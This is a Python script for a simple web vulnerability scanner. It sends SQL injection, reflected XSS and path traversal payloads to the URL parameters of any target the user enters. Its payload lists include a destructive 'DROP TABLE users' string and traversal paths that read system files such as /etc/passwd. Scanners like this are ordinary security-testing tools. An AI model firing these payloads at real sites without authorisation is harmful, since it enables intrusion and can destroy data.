from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
import sys


class SecurityScanner:
    def __init__(self):
        self.payloads = {
            "SQLi": ["'", "''", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--", "\" OR \"1\"=\"1"],
            "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
                    "<svg onload=alert(1)>"],
            "PathTraversal": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2fetc/passwd"]
        }
        self.results = []

    def get_user_input(self):
        """Get target URL from user"""
        print("\n" + "=" * 60)
        print("         Web Security Scanner Tool v1.0")
        print("=" * 60)
        print("\n[+] Supported tests:")
        print("    - SQL Injection")
        print("    - Cross-Site Scripting (XSS)")
        print("    - Path Traversal")
        print("-" * 60)

        url = input("\n[?] Enter target URL: ").strip()

        if not url:
            print("[!] URL cannot be empty!")
            return None

        # Add http:// if no protocol specified
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        return url

    def extract_params_from_url(self, url):
        """Extract parameters from URL (handles fragments properly)"""
        # Remove fragment (#...) because it's client-side
        if '#' in url:
            url = url.split('#')[0]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        return parsed, params

    def manual_param_input(self):
        """Allow user to manually add parameters if none found"""
        print("\n[!] No parameters found in URL.")
        print("[?] Do you want to:")
        print("    1. Enter parameters manually")
        print("    2. Test with common parameter names")
        print("    3. Exit")

        choice = input("\n[>] Choose (1/2/3): ").strip()

        if choice == "1":
            param_name = input("[?] Enter parameter name (e.g., q, id, search): ").strip()
            param_value = input("[?] Enter parameter value (e.g., test, 1): ").strip()
            return {param_name: [param_value]}

        elif choice == "2":
            # Common parameter names for testing
            common_params = ["q", "id", "search", "query", "page", "user", "name", "cat", "product", "post"]
            print(f"\n[+] Testing common parameters: {', '.join(common_params)}")
            return {param: ["test"] for param in common_params}

        else:
            print("[!] Exiting...")
            sys.exit(0)

    def test_sql_injection(self, base_url, param_name, original_value):
        """Test SQL injection payloads"""
        print(f"\n  [*] Testing SQLi on parameter: {param_name}")

        for payload in self.payloads["SQLi"]:
            # Build URL with payload
            if '?' in base_url:
                test_url = base_url + f"&{param_name}={requests.utils.quote(payload)}"
            else:
                test_url = base_url + f"?{param_name}={requests.utils.quote(payload)}"

            try:
                resp = requests.get(test_url, timeout=5, verify=False)

                # Detection keywords
                sql_errors = [
                    "sql", "mysql", "syntax", "ora-", "postgres",
                    "unclosed", "odbc", "driver", "server error",
                    "you have an error", "warning: mysql"
                ]

                if any(error in resp.text.lower() for error in sql_errors):
                    self.results.append({
                        "type": "SQL Injection",
                        "param": param_name,
                        "payload": payload,
                        "evidence": "SQL error message in response"
                    })
                    print(f"    [!] SQLi FOUND! Payload: {payload}")
                    return  # Stop testing once found

            except requests.exceptions.RequestException as e:
                print(f"    [-] Request failed: {e}")

        print(f"    [✓] No SQLi found on {param_name}")

    def test_xss(self, base_url, param_name, original_value):
        """Test XSS payloads"""
        print(f"\n  [*] Testing XSS on parameter: {param_name}")

        for payload in self.payloads["XSS"]:
            if '?' in base_url:
                test_url = base_url + f"&{param_name}={requests.utils.quote(payload)}"
            else:
                test_url = base_url + f"?{param_name}={requests.utils.quote(payload)}"

            try:
                resp = requests.get(test_url, timeout=5, verify=False)

                if payload in resp.text:
                    self.results.append({
                        "type": "Reflected XSS",
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Payload reflected in response"
                    })
                    print(f"    [!] XSS FOUND! Payload: {payload}")
                    return

            except requests.exceptions.RequestException as e:
                print(f"    [-] Request failed: {e}")

        print(f"    [✓] No XSS found on {param_name}")

    def test_path_traversal(self, base_url, param_name, original_value):
        """Test path traversal payloads"""
        print(f"\n  [*] Testing Path Traversal on parameter: {param_name}")

        for payload in self.payloads["PathTraversal"]:
            if '?' in base_url:
                test_url = base_url + f"&{param_name}={requests.utils.quote(payload)}"
            else:
                test_url = base_url + f"?{param_name}={requests.utils.quote(payload)}"

            try:
                resp = requests.get(test_url, timeout=5, verify=False)

                # Detection keywords for sensitive files
                sensitive_patterns = ["root:", "daemon:", "bin:", "[extensions]", "[files]"]

                if any(pattern in resp.text.lower() for pattern in sensitive_patterns):
                    self.results.append({
                        "type": "Path Traversal",
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Sensitive file content detected"
                    })
                    print(f"    [!] Path Traversal FOUND! Payload: {payload}")
                    return

            except requests.exceptions.RequestException as e:
                print(f"    [-] Request failed: {e}")

        print(f"    [✓] No Path Traversal found on {param_name}")

    def run_scan(self, base_url, params):
        """Run all tests on parameters"""
        if not params:
            print("\n[!] No parameters to test!")
            return

        print(f"\n[+] Found {len(params)} parameter(s) to test: {', '.join(params.keys())}")
        print("\n" + "=" * 60)
        print("[*] Starting security scan...")
        print("=" * 60)

        for param_name in params.keys():
            original_value = params[param_name][0] if params[param_name] else "test"

            print(f"\n{'=' * 50}")
            print(f"[>>] Testing parameter: {param_name}")
            print(f"{'=' * 50}")

            self.test_sql_injection(base_url, param_name, original_value)
            self.test_xss(base_url, param_name, original_value)
            self.test_path_traversal(base_url, param_name, original_value)

    def generate_report(self):
        """Print final report"""
        print("\n" + "=" * 60)
        print("              SCAN REPORT")
        print("=" * 60)

        if not self.results:
            print("\n[✓] No vulnerabilities found!")
            print("[✓] The target appears to be secure (or the scanner missed something)")
        else:
            print(f"\n[!] Found {len(self.results)} vulnerability(s):\n")
            for i, vuln in enumerate(self.results, 1):
                print(f"  {i}. Type: {vuln['type']}")
                print(f"     Parameter: {vuln['param']}")
                print(f"     Payload: {vuln['payload']}")
                print(f"     Evidence: {vuln['evidence']}")
                print()

        print("=" * 60)
        print("[*] Scan completed!")
        print("=" * 60)

    def run(self):
        """Main execution"""
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # Get target URL
        target_url = self.get_user_input()
        if not target_url:
            return

        print(f"\n[+] Target: {target_url}")

        # Extract or get parameters
        parsed, params = self.extract_params_from_url(target_url)

        if not params:
            params = self.manual_param_input()

        # Build base URL (without query string)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Run the scan
        self.run_scan(base_url, params)

        # Generate report
        self.generate_report()


if __name__ == "__main__":
    scanner = SecurityScanner()
    scanner.run()
